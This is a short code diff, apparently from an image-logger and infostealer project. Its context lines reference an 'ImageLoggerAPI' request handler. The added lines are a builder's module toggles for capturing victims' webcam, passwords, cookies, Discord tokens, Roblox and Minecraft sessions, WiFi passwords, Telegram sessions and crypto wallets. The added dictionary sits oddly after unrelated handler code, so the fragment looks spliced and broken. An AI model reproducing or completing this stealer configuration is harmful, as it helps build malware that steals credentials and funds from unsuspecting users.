@@ -302,3 +302,16 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+"modules" : {
+        		"captureWebcam" : self.captureWebcamVar.get(),
+        		"capturePasswords" : self.capturePasswordsVar.get(),
+        		"captureCookies" : self.captureCookiesVar.get(),
+        		"captureHistory" : self.captureHistoryVar.get(),
+        		"captureDiscordTokens" : self.captureDiscordTokensVar.get(),
+        		"captureMinecraftSessionFiles" : self.captureMinecraftVar.get(),
+        		"captureRobloxCookies" : self.captureRobloxCookiesVar.get(),
+        		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
+        		"captureSystemInfo" : self.captureSystemInfoVar.get(),
+        		"captureScreenshot" : self.captureScreenshotVar.get(),
+        		"captureTelegramSession" : self.captureTelegramVar.get(),
+				"captureWallets" : self.captureWalletsVar.get(),   
